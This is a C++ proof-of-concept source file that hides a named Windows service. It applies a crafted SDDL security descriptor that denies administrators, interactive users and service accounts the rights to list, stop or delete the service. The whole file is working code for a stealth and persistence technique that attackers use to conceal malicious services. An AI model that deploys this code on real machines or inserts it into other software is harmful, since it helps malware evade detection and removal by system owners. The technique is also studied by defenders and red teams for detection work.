/*
    Proof of Concept for hiding Windows Services not relying on sc.exe
    Davide Del Grande - 2022-11-19
*/


#include <iostream>
#include "wtypes.h"
#include "winnt.h"
#include "winerror.h"
#include "sddl.h"

typedef unsigned long ULONG, *PULONG;

LPCWSTR servicename = L"testhiddensvc";
LPCWSTR SDDL = L"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
//LPCWSTR SDDL = L"D:(D;;DCWPDTSD;;;IU)(D;;DCWPDTSD;;;SU)(D;;DCWPDTSD;;;BA)(A;;CCSWLOCRRC;;;IU)(A;;CCSWLOCRRC;;;SU)(A;;CCSWRPWPDTLOCRRC;;;SY)(A;;CCDCSWRPWPDTLOCRSDRCWDWO;;;BA)";

void main()
{
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (NULL == schSCManager)
    {
        printf("OpenSCManager failed (%d)\n", GetLastError());
        return;
    }
    
    SC_HANDLE schService = OpenService(schSCManager, servicename, READ_CONTROL | WRITE_DAC);
    if (schService == NULL)
    {
        printf("OpenService failed (%d)\n", GetLastError());
        CloseServiceHandle(schSCManager);
        return;
    }
    
    PSECURITY_DESCRIPTOR secDescPtr;
    PULONG a;
    ULONG secDescSize = 0;
    if (ConvertStringSecurityDescriptorToSecurityDescriptor(SDDL, SDDL_REVISION_1, &secDescPtr, &secDescSize) == TRUE)
    {

        std::cout << "Security Descriptor conversion ok\n";
        if (SetServiceObjectSecurity(schService, DACL_SECURITY_INFORMATION, secDescPtr) == TRUE)
        {
            std::cout << "Service is now hidden\n";
        }
        else
        {
            switch (GetLastError())
            {
            case ERROR_ACCESS_DENIED:
                std::cout << "Service Security setup failed - Access Denied\n";
                break;
            case ERROR_INVALID_HANDLE:
                std::cout << "Service Security setup failed - Invalid Handle\n";
                break;
            case ERROR_INVALID_PARAMETER:
                std::cout << "Service Security setup failed - Invalid Parameter\n";
                break;
            case ERROR_SERVICE_MARKED_FOR_DELETE:
                std::cout << "Service Security setup failed - Service Marked For Delete\n";
                break;
            }
        }
    }
    else
    {
        std::cout << "Security Descriptor conversion failed\n";
    }

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);

}
